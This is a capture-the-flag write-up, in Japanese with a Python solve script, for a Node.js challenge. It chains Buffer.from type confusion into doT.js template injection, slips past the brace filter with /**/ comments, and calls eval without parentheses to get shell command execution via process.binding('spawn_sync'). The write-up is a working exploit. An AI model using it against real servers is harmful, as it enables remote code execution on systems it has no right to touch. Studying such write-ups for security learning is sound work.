# Hello from 2025

## Description
Happy new year!
Please test on your local machine before attempting on remote.

## Writeup

Node.jsにおける`Buffer.from`は、様々な引数の型を受け取る。公式ドキュメントには記載されていないが、以下の形式もその一つである。([参考](https://github.com/nodejs/node/blob/413975a580429585fbbf1e6d3bf55179b2b1e075/lib/buffer.js#L537))

```js
// <Buffer 61 62 63>
Buffer.from({
    type: "Buffer",
    data: [0x61, 0x62, 0x63]
})
```

`/now`のエンドポイントを利用して、`new Date().toString()`を行った時のフォーマットを知ることができる。これを利用して、`Buffer.from(user)`の値と`Buffer.from(new Date('2025-01-01T00:00:00'))`の値が一致するような入力を行うことができる。

これにより、doT.jsのSSTIを行うことができるようになる。doT.jsは、`{{<式>}}`の形式で任意コード実行ができる。しかし、`{{`と`}}`が禁止されている。

doT.jsの[ソースコード](https://github.com/olado/doT/blob/031d3bb7520eed6b93886df2b650b7fce12a7007/doT.js#L98)をよく読むと、`/*...*/`のような形式のコメントが、テンプレートの解釈前に取り除かれていることがわかる。これにより、`{/**/{<式>}/**/}`の形式でコードを実行することができる。

`(`と`)`を利用せずに関数を呼び出すには、関数内で定義されている`escapeHTML`を`{{=escapeHTML=eval}}`で呼び出し、`{{!it.x}}`で実行することができる。

これにより、任意のJavascriptコードを呼び出すことができる。

```python
import requests

URL = "http://localhost:1337/"

r = requests.get(URL + "now")
print(r.text)

cmd = 'cat /flag-*'
data = {
    "type": "Buffer",
    "data": list("Wed Jan 01 2025 00:00:00 GMT+0000 (Coordinated Universal Time)".encode()), 
    "template": "{/**/{=encodeHTML=eval}/**/}{/**/{!it.x}/**/}",
    "x": """process.binding('spawn_sync').spawn({
    file: 'bash',
    args: ['bash','-c', '%s'], 
    stdio: [
        { type: 'pipe', readable: true, writable: true },
        { type: 'pipe', readable: true, writable: true }
    ],
}).output + ''""" % cmd
}
r = requests.post(URL, json=data)
print(r.text)
```